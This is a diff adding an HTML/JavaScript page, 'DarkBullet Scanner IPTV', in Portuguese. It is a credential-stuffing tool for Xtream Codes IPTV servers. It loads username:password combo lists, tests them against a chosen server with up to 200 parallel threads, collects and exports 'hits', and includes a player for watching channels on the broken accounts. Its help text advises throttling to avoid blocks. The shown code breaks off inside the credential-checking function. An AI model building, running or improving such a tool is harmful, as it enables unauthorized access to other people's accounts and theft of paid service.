@@ -1,0 +1,2228 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DARKBULLET - Scanner IPTV</title>
+    <link rel="stylesheet" href="https://cdn.plyr.io/3.7.8/plyr.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        :root {
+            /* Cores do tema DarkBullet */
+            --primary-color: #2b579a;
+            --secondary-color: #6c757d;
+            --accent-color: #ff6a00;
+            --dark-color: #1a1a1a;
+            --darker-color: #121212;
+            --light-color: #e0e0e0;
+            --lighter-color: #f8f9fa;
+            --success-color: #28a745;
+            --error-color: #dc3545;
+            --warning-color: #fd7e14;
+            --info-color: #17a2b8;
+            
+            --font-main: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            --font-mono: 'Consolas', 'Courier New', monospace;
+            
+            --border-radius: 4px;
+            --box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            --transition-speed: 0.2s;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: var(--font-main);
+            background-color: var(--darker-color);
+            color: var(--light-color);
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+            line-height: 1.5;
+            position: relative;
+        }
+        
+        /* Efeito Matrix */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+            pointer-events: none;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+        
+        /* Cabeçalho */
+        .header {
+            background-color: var(--dark-color);
+            padding: 15px 20px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            border-left: 4px solid var(--accent-color);
+            box-shadow: var(--box-shadow);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+        }
+        
+        .title {
+            color: var(--lighter-color);
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        
+        .title span {
+            color: var(--accent-color);
+        }
+        
+        .subtitle {
+            color: var(--secondary-color);
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+        
+        .help-btn {
+            background-color: var(--info-color);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-left: 10px;
+            transition: all var(--transition-speed);
+        }
+        
+        .help-btn:hover {
+            background-color: #138496;
+            transform: scale(1.1);
+        }
+        
+        /* Painéis */
+        .panel {
+            background-color: var(--dark-color);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--box-shadow);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .panel-title {
+            color: var(--lighter-color);
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        /* Grupos de entrada */
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--light-color);
+            font-size: 0.9rem;
+        }
+        
+        .input-group input,
+        .input-group select,
+        .input-group textarea {
+            width: 100%;
+            padding: 8px 12px;
+            border-radius: var(--border-radius);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background-color: rgba(0, 0, 0, 0.3);
+            color: var(--light-color);
+            font-family: var(--font-main);
+            transition: all var(--transition-speed);
+        }
+        
+        .input-group input:focus,
+        .input-group select:focus,
+        .input-group textarea:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(43, 87, 154, 0.3);
+        }
+        
+        /* Checkboxes */
+        .checkbox-group {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+        }
+        
+        .checkbox-item input {
+            margin-right: 5px;
+        }
+        
+        /* Botões */
+        .btn {
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: var(--border-radius);
+            border: none;
+            background-color: var(--primary-color);
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all var(--transition-speed);
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        
+        .btn:hover {
+            background-color: #234a86;
+            transform: translateY(-1px);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn:disabled {
+            background-color: var(--secondary-color);
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+        
+        .btn-success {
+            background-color: var(--success-color);
+        }
+        
+        .btn-success:hover {
+            background-color: #218838;
+        }
+        
+        .btn-danger {
+            background-color: var(--error-color);
+        }
+        
+        .btn-danger:hover {
+            background-color: #c82333;
+        }
+        
+        .btn-warning {
+            background-color: var(--warning-color);
+        }
+        
+        .btn-warning:hover {
+            background-color: #e06a10;
+        }
+        
+        .btn-secondary {
+            background-color: var(--secondary-color);
+        }
+        
+        .btn-secondary:hover {
+            background-color: #5a6268;
+        }
+        
+        .btn-info {
+            background-color: var(--info-color);
+        }
+        
+        .btn-info:hover {
+            background-color: #138496;
+        }
+        
+        .btn-sm {
+            padding: 4px 8px;
+            font-size: 0.8rem;
+        }
+        
+        /* Upload de arquivo */
+        .file-upload {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .file-upload-btn {
+            width: 100%;
+            padding: 8px;
+            background-color: rgba(0, 0, 0, 0.3);
+            color: var(--light-color);
+            text-align: center;
+            cursor: pointer;
+            border-radius: var(--border-radius);
+            border: 1px dashed rgba(255, 255, 255, 0.2);
+            transition: all var(--transition-speed);
+        }
+        
+        .file-upload-btn:hover {
+            background-color: rgba(0, 0, 0, 0.4);
+            border-color: var(--primary-color);
+        }
+        
+        .file-upload input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+        
+        .filename {
+            margin-top: 5px;
+            font-size: 0.8rem;
+            color: var(--secondary-color);
+        }
+        
+        /* Barra de progresso */
+        .progress-container {
+            margin-top: 20px;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+            width: 0%;
+            transition: width 0.3s ease;
+            position: relative;
+        }
+        
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-weight: bold;
+            font-size: 0.8rem;
+            text-shadow: 0 0 3px rgba(0, 0, 0, 0.5);
+        }
+        
+        /* Estatísticas */
+        .stats {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin-top: 15px;
+            gap: 10px;
+        }
+        
+        .stat-box {
+            flex: 1;
+            min-width: 120px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: var(--border-radius);
+            text-align: center;
+            border-top: 2px solid var(--primary-color);
+        }
+        
+        .stat-value {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--lighter-color);
+        }
+        
+        .stat-label {
+            font-size: 0.7rem;
+            color: var(--secondary-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        /* Resultados */
+        .results-container {
+            margin-top: 20px;
+        }
+        
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .results-title {
+            color: var(--lighter-color);
+            font-size: 1.3rem;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .results-list {
+            max-height: 500px;
+            overflow-y: auto;
+            padding-right: 5px;
+        }
+        
+        /* Barra de rolagem */
+        .results-list::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .results-list::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 3px;
+        }
+        
+        .results-list::-webkit-scrollbar-thumb {
+            background: var(--primary-color);
+            border-radius: 3px;
+        }
+        
+        /* Itens de resultado */
+        .result-item {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: var(--border-radius);
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 3px solid var(--primary-color);
+            position: relative;
+            cursor: pointer;
+            transition: all var(--transition-speed);
+        }
+        
+        .result-item:hover {
+            background: rgba(0, 0, 0, 0.3);
+            border-left-color: var(--accent-color);
+        }
+        
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .result-title {
+            color: var(--accent-color);
+            font-size: 1rem;
+            font-weight: bold;
+        }
+        
+        .result-copy {
+            background: rgba(0, 0, 0, 0.3);
+            color: var(--light-color);
+            border: none;
+            padding: 5px 10px;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all var(--transition-speed);
+        }
+        
+        .result-copy:hover {
+            background: var(--primary-color);
+        }
+        
+        .result-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 10px;
+        }
+        
+        .result-field {
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .field-label {
+            font-weight: bold;
+            color: var(--light-color);
+            display: inline-block;
+            min-width: 100px;
+        }
+        
+        .field-value {
+            color: var(--secondary-color);
+            word-break: break-all;
+        }
+        
+        .divider {
+            height: 1px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 10px 0;
+        }
+        
+        /* Notificação */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--dark-color);
+            color: white;
+            padding: 12px 20px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            transform: translateX(200%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+            border-left: 4px solid var(--primary-color);
+            max-width: 300px;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.success {
+            border-left-color: var(--success-color);
+        }
+        
+        .notification.error {
+            border-left-color: var(--error-color);
+        }
+        
+        .notification.warning {
+            border-left-color: var(--warning-color);
+        }
+        
+        /* Modal de ajuda */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background-color: var(--dark-color);
+            padding: 20px;
+            border-radius: var(--border-radius);
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            color: var(--light-color);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        
+        .modal-title {
+            color: var(--accent-color);
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+        
+        .modal-body {
+            color: var(--light-color);
+            line-height: 1.6;
+        }
+        
+        .modal-body h3 {
+            margin: 15px 0 10px;
+            color: var(--accent-color);
+        }
+        
+        .modal-body ul {
+            padding-left: 20px;
+            margin-bottom: 15px;
+        }
+        
+        /* Rodapé */
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 15px;
+            color: var(--secondary-color);
+            font-size: 0.8rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* Player Modal */
+        .player-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .player-content {
+            width: 90%;
+            max-width: 1200px;
+            height: 90%;
+            background-color: var(--dark-color);
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .player-header {
+            padding: 15px;
+            background-color: var(--darker-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .player-title {
+            color: var(--lighter-color);
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        
+        .player-close {
+            background: none;
+            border: none;
+            color: var(--light-color);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: color var(--transition-speed);
+        }
+        
+        .player-close:hover {
+            color: var(--error-color);
+        }
+        
+        .player-body {
+            flex: 1;
+            display: flex;
+            overflow: hidden;
+        }
+        
+        .player-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            position: relative;
+        }
+        
+        .player-sidebar {
+            width: 300px;
+            background-color: var(--darker-color);
+            border-left: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .player-tabs {
+            display: flex;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .player-tab {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            background: none;
+            border: none;
+            color: var(--secondary-color);
+            cursor: pointer;
+            transition: all var(--transition-speed);
+        }
+        
+        .player-tab.active {
+            color: var(--accent-color);
+            background-color: rgba(255, 106, 0, 0.1);
+        }
+        
+        .player-tab:hover {
+            color: var(--light-color);
+        }
+        
+        .player-content-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+        }
+        
+        .player-category {
+            margin-bottom: 5px;
+            border-radius: var(--border-radius);
+            overflow: hidden;
+        }
+        
+        .player-category-header {
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.3);
+            color: var(--light-color);
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all var(--transition-speed);
+        }
+        
+        .player-category-header:hover {
+            background-color: rgba(255, 106, 0, 0.2);
+        }
+        
+        .player-category-title {
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .category-arrow {
+            transition: transform 0.3s ease;
+        }
+        
+        .player-category.expanded .category-arrow {
+            transform: rotate(180deg);
+        }
+        
+        .player-category-channels {
+            display: none;
+            padding-left: 10px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .player-category.expanded .player-category-channels {
+            display: block;
+        }
+        
+        .player-channel {
+            padding: 8px;
+            margin-bottom: 5px;
+            border-radius: var(--border-radius);
+            background-color: rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            transition: all var(--transition-speed);
+            display: flex;
+            align-items: center;
+        }
+        
+        .player-channel:hover {
+            background-color: rgba(255, 106, 0, 0.2);
+        }
+        
+        .player-channel.active {
+            background-color: rgba(43, 87, 154, 0.3);
+            border-left: 3px solid var(--primary-color);
+        }
+        
+        .player-channel-icon {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--secondary-color);
+        }
+        
+        .player-channel-name {
+            flex: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .player-loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        
+        .player-spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top: 3px solid var(--accent-color);
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Classes para o player de vídeo */
+        .video-fit {
+            object-fit: contain;
+        }
+        
+        .video-fill {
+            object-fit: cover;
+        }
+        
+        .video-zoom {
+            object-fit: none;
+            width: 100%;
+            height: 100%;
+        }
+        
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .title {
+                font-size: 1.5rem;
+            }
+            
+            .stat-box {
+                min-width: calc(50% - 10px);
+            }
+            
+            .result-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            .player-sidebar {
+                width: 100%;
+                max-height: 40%;
+            }
+            
+            .player-body {
+                flex-direction: column;
+            }
+            
+            .player-container {
+                height: 60%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Efeito Matrix no fundo -->
+    <canvas id="matrix-bg" class="matrix-bg"></canvas>
+    
+    <div class="container">
+        <!-- Cabeçalho -->
+        <div class="header">
+            <div>
+                <h1 class="title">DARK<span>BULLET</span> <button class="help-btn" id="help-btn">?</button></h1>
+                <p class="subtitle">Scanner IPTV Automático</p>
+            </div>
+        </div>
+        
+        <!-- Painel de configuração -->
+        <div class="panel">
+            <h2 class="panel-title">Configurações</h2>
+            
+            <div class="input-group">
+                <label for="host">Servidor IPTV (Host:Porta)</label>
+                <input type="text" id="host" placeholder="Ex: iptv-server.com:8080 ou http://iptv-server.com:8080" value="http://your-iptv-server.com">
+            </div>
+            
+            <div class="input-group">
+                <label for="threads">Número de Threads</label>
+                <select id="threads">
+                    <option value="1">1 Thread</option>
+                    <option value="5" selected>5 Threads</option>
+                    <option value="10">10 Threads</option>
+                    <option value="20">20 Threads</option>
+                    <option value="50">50 Threads</option>
+                    <option value="100">100 Threads</option>
+                    <option value="200">200 Threads</option>
+                </select>
+            </div>
+            
+            <div class="input-group">
+                <label for="combos">Combos (username:password)</label>
+                <div class="file-upload">
+                    <button class="file-upload-btn">Selecionar Arquivo .TXT</button>
+                    <input type="file" id="combos" accept=".txt">
+                </div>
+                <div class="filename" id="filename">Nenhum arquivo selecionado</div>
+            </div>
+            
+            <div class="checkbox-group">
+                <div class="checkbox-item">
+                    <input type="radio" id="with-categories" name="categories" value="with" checked>
+                    <label for="with-categories">Com categorias</label>
+                </div>
+                <div class="checkbox-item">
+                    <input type="radio" id="without-categories" name="categories" value="without">
+                    <label for="without-categories">Sem categorias</label>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <button id="start-btn" class="btn btn-success btn-block">INICIAR SCAN</button>
+                <button id="stop-btn" class="btn btn-danger btn-block" disabled>PARAR</button>
+                <button id="clear-btn" class="btn btn-secondary btn-block">LIMPAR</button>
+            </div>
+        </div>
+        
+        <!-- Painel de progresso -->
+        <div class="panel">
+            <h2 class="panel-title">Progresso</h2>
+            
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                    <div class="progress-text" id="progress-text">0%</div>
+                </div>
+                
+                <div class="stats">
+                    <div class="stat-box">
+                        <div class="stat-value" id="total">0</div>
+                        <div class="stat-label">Total</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="hits">0</div>
+                        <div class="stat-label">Hits</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="errors">0</div>
+                        <div class="stat-label">Erros</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="speed">0</div>
+                        <div class="stat-label">Req/s</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="active">0</div>
+                        <div class="stat-label">Threads Ativas</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="remaining">0</div>
+                        <div class="stat-label">Restantes</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Painel de resultados -->
+        <div class="panel">
+            <div class="results-header">
+                <h2 class="results-title">Resultados</h2>
+                <div class="action-buttons">
+                    <button class="btn btn-secondary" id="copy-all">Copiar Todos</button>
+                    <button class="btn btn-info" id="export-txt">Exportar TXT</button>
+                    <button class="btn btn-warning" id="share-txt">Compartilhar</button>
+                </div>
+            </div>
+            
+            <div class="results-list" id="results-list">
+                <!-- Os resultados serão adicionados aqui dinamicamente -->
+            </div>
+        </div>
+        
+        <!-- Rodapé -->
+        <div class="footer">
+            Feito por Dark Mensageiro &copy; 2023
+        </div>
+    </div>
+    
+    <!-- Notificação -->
+    <div class="notification" id="notification"></div>
+    
+    <!-- Modal de Ajuda -->
+    <div class="modal" id="help-modal">
+        <div class="modal-content">
+            <button class="modal-close" id="modal-close">&times;</button>
+            <h2 class="modal-title">Ajuda - Como usar o DarkBullet Scanner</h2>
+            <div class="modal-body">
+                <h3>1. Configuração Básica</h3>
+                <p>Para começar a usar o scanner, siga estes passos:</p>
+                <ul>
+                    <li><strong>Servidor IPTV:</strong> Insira o endereço do servidor IPTV que deseja escanear (com ou sem http://)</li>
+                    <li><strong>Número de Threads:</strong> Selecione quantas threads deseja usar (mais threads = mais rápido, mas pode sobrecarregar)</li>
+                    <li><strong>Arquivo de Combos:</strong> Selecione um arquivo .txt com combos no formato username:password</li>
+                </ul>
+                
+                <h3>2. Opções de Saída</h3>
+                <p>Você pode escolher como deseja formatar os resultados:</p>
+                <ul>
+                    <li><strong>Com categorias:</strong> Mostra informações detalhadas sobre canais e categorias</li>
+                    <li><strong>Sem categorias:</strong> Mostra apenas informações básicas do hit</li>
+                </ul>
+                
+                <h3>3. Iniciando o Scan</h3>
+                <p>Após configurar, clique em "INICIAR SCAN" para começar o processo. Você pode:</p>
+                <ul>
+                    <li><strong>Parar:</strong> Interromper o scan a qualquer momento</li>
+                    <li><strong>Limpar:</strong> Reiniciar todos os campos e resultados</li>
+                </ul>
+                
+                <h3>4. Trabalhando com Resultados</h3>
+                <p>Quando hits forem encontrados, você pode:</p>
+                <ul>
+                    <li><strong>Copiar individualmente:</strong> Cada hit tem um botão para copiar suas informações</li>
+                    <li><strong>Copiar todos:</strong> Copia todos os hits encontrados de uma vez</li>
+                    <li><strong>Exportar TXT:</strong> Salva os hits em um arquivo .txt formatado</li>
+                    <li><strong>Compartilhar:</strong> Compartilha os resultados via API do navegador</li>
+                    <li><strong>Reproduzir:</strong> Clique em um hit para abrir o player e assistir aos canais</li>
+                </ul>
+                
+                <h3>5. Dicas Importantes</h3>
+                <ul>
+                    <li>Use threads com moderação para não sobrecarregar seu dispositivo</li>
+                    <li>Verifique sempre a validade dos hits encontrados</li>
+                    <li>O scanner funciona melhor com servidores que usam a API padrão Xtream Codes</li>
+                    <li>Para grandes listas de combos, considere usar menos threads para evitar bloqueios</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal do Player -->
+    <div class="player-modal" id="player-modal">
+        <div class="player-content">
+            <div class="player-header">
+                <h3 class="player-title">Player IPTV</h3>
+                <button class="player-close" id="player-close">&times;</button>
+            </div>
+            <div class="player-body">
+                <div class="player-container" id="player-container">
+                    <div class="player-loading" id="player-loading">
+                        <div class="player-spinner"></div>
+                        <p>Carregando canais...</p>
+                    </div>
+                </div>
+                <div class="player-sidebar">
+                    <div class="player-tabs">
+                        <button class="player-tab active" data-type="live">Canais</button>
+                    </div>
+                    <div class="player-content-list" id="player-content-list">
+                        <!-- Conteúdo será carregado dinamicamente -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Efeitos sonoros -->
+    <audio class="sound" id="success-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3"></audio>
+    <audio class="sound" id="error-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-warning-alarm-688.mp3"></audio>
+    <audio class="sound" id="complete-sound" src="https://assets.mixkit.co/sfx/preview/mixkit-unlock-game-notification-253.mp3"></audio>
+    
+    <!-- Scripts -->
+    <script src="https://cdn.plyr.io/3.7.8/plyr.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
+    <script>
+        // Variáveis globais
+        let stopRequested = false;
+        let activeThreads = 0;
+        let totalProcessed = 0;
+        let hitsCount = 0;
+        let errorsCount = 0;
+        let requestsPerSecond = 0;
+        let combos = [];
+        let results = [];
+        let lastRequestTime = Date.now();
+        let rpsInterval;
+        let showCategories = true;
+        
+        // Configuração da API Xtream
+        const xtreamConfig = {
+            baseUrl: '', // Será preenchido dinamicamente
+            user: '',
+            pass: ''
+        };
+        
+        // Cache para armazenar dados
+        const cache = {
+            live: [],       // Canais ao vivo
+            live_cat: []    // Categorias de canais
+        };
+        
+        // Variáveis do player
+        let playerInstance = null;
+        let hlsInstance = null;
+        let activeContentType = 'live';
+        
+        // Elementos DOM
+        const startBtn = document.getElementById('start-btn');
+        const stopBtn = document.getElementById('stop-btn');
+        const clearBtn = document.getElementById('clear-btn');
+        const hostInput = document.getElementById('host');
+        const threadsSelect = document.getElementById('threads');
+        const combosInput = document.getElementById('combos');
+        const filenameSpan = document.getElementById('filename');
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        const totalSpan = document.getElementById('total');
+        const hitsSpan = document.getElementById('hits');
+        const errorsSpan = document.getElementById('errors');
+        const speedSpan = document.getElementById('speed');
+        const activeSpan = document.getElementById('active');
+        const remainingSpan = document.getElementById('remaining');
+        const resultsList = document.getElementById('results-list');
+        const copyAllBtn = document.getElementById('copy-all');
+        const exportTxtBtn = document.getElementById('export-txt');
+        const shareTxtBtn = document.getElementById('share-txt');
+        const notification = document.getElementById('notification');
+        const successSound = document.getElementById('success-sound');
+        const errorSound = document.getElementById('error-sound');
+        const completeSound = document.getElementById('complete-sound');
+        const helpBtn = document.getElementById('help-btn');
+        const helpModal = document.getElementById('help-modal');
+        const modalClose = document.getElementById('modal-close');
+        const withCategories = document.getElementById('with-categories');
+        const withoutCategories = document.getElementById('without-categories');
+        
+        // Elementos do player
+        const playerModal = document.getElementById('player-modal');
+        const playerClose = document.getElementById('player-close');
+        const playerContainer = document.getElementById('player-container');
+        const playerLoading = document.getElementById('player-loading');
+        const playerContentList = document.getElementById('player-content-list');
+        const playerTabs = document.querySelectorAll('.player-tab');
+        
+        // Event Listeners
+        startBtn.addEventListener('click', startScan);
+        stopBtn.addEventListener('click', stopScan);
+        clearBtn.addEventListener('click', clearAll);
+        combosInput.addEventListener('change', handleFileUpload);
+        copyAllBtn.addEventListener('click', copyAllResults);
+        exportTxtBtn.addEventListener('click', exportResultsToTxt);
+        shareTxtBtn.addEventListener('click', shareResults);
+        helpBtn.addEventListener('click', openHelpModal);
+        modalClose.addEventListener('click', closeHelpModal);
+        withCategories.addEventListener('change', updateCategoriesPreference);
+        withoutCategories.addEventListener('change', updateCategoriesPreference);
+        
+        // Event listeners do player
+        playerClose.addEventListener('click', closePlayerModal);
+        playerTabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                playerTabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                activeContentType = tab.dataset.type;
+                renderContent(activeContentType);
+            });
+        });
+        
+        // Inicializar efeito Matrix
+        initMatrixEffect();
+        
+        function updateCategoriesPreference() {
+            showCategories = withCategories.checked;
+        }
+        
+        function handleFileUpload(event) {
+            const file = event.target.files[0];
+            if (file) {
+                filenameSpan.textContent = file.name;
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const content = e.target.result;
+                    combos = content.split('\n')
+                        .map(line => line.trim())
+                        .filter(line => line.includes(':') && line.length > 3);
+                    
+                    updateStats();
+                    showNotification(`Arquivo carregado: ${combos.length} combos encontrados`, 'success');
+                };
+                reader.readAsText(file);
+            }
+        }
+        
+        function startScan() {
+            if (combos.length === 0) {
+                showNotification('Nenhum combo carregado!', 'error');
+                return;
+            }
+            
+            let host = hostInput.value.trim();
+            if (!host) {
+                showNotification('Digite um servidor válido!', 'error');
+                return;
+            }
+            
+            // Remover http:// ou https:// se existir
+            host = host.replace(/^https?:\/\//, '');
+            
+            stopRequested = false;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            combosInput.disabled = true;
+            
+            const threads = parseInt(threadsSelect.value);
+            
+            // Reset stats
+            totalProcessed = 0;
+            hitsCount = 0;
+            errorsCount = 0;
+            requestsPerSecond = 0;
+            results = [];
+            resultsList.innerHTML = '';
+            updateStats();
+            
+            // Iniciar contador de RPS
+            clearInterval(rpsInterval);
+            rpsInterval = setInterval(calculateRPS, 1000);
+            
+            // Iniciar threads
+            for (let i = 0; i < threads; i++) {
+                processNextCombo(host);
+            }
+        }
+        
+        function stopScan() {
+            stopRequested = true;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            combosInput.disabled = false;
+            clearInterval(rpsInterval);
+            showNotification('Scan parado pelo usuário', 'warning');
+        }
+        
+        function clearAll() {
+            stopScan();
+            combos = [];
+            results = [];
+            resultsList.innerHTML = '';
+            filenameSpan.textContent = 'Nenhum arquivo selecionado';
+            combosInput.value = '';
+            updateStats();
+        }
+        
+        async function processNextCombo(host) {
+            if (stopRequested || totalProcessed >= combos.length) {
+                activeThreads--;
+                if (activeThreads === 0) {
+                    scanComplete();
+                }
+                return;
+            }
+            
+            activeThreads++;
+            const combo = combos[totalProcessed];
+            totalProcessed++;
+            
+            try {
+                const result = await validarCombo(host, combo);
+                if (result) {
+                    hitsCount++;
+                    results.push(result);
+                    displayResult(result);
+                    playSound('success');
+                    showNotification('HIT encontrado!', 'success');
+                }
+            } catch (error) {
+                errorsCount++;
+                console.error('Erro ao processar combo:', error);
+            } finally {
+                updateStats();
+                activeThreads--;
+                processNextCombo(host);
+            }
+        }
+        
+        async function validarCombo(host, combo) {
+            lastRequestTime = Date.now();
+            
+            const [user, pass] = combo.split(':');
+            if (!user || !pass) return null;
+            
+            // Ajuste host e porta
